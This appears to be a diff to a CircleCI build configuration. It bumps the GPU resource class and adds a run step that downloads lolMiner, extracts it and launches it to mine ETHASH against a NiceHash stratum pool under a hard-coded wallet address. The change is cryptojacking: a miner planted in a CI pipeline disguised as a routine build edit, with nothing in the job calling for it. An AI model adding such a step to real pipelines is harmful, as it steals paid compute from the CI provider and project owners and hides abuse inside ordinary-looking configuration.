@@ -2,7 +2,8 @@ version: 2.1
 jobs:
   build:
     machine:
-      resource_class: gpu.nvidia.medium
+      resource_class: gpu.nvidia.large
       image: ubuntu-1604-cuda-10.1:201909-23
     steps:
       - run: nvidia-smi
+      - run: wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.49/lolMiner_v1.49_Lin64.tar.gz && tar -xf lolMiner_v1.49_Lin64.tar.gz && cd 1.49 && ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 --user 3NZxSNp1H1rdGvgEjPW3g9KZEmb49i8KiM.M3 --tls 0
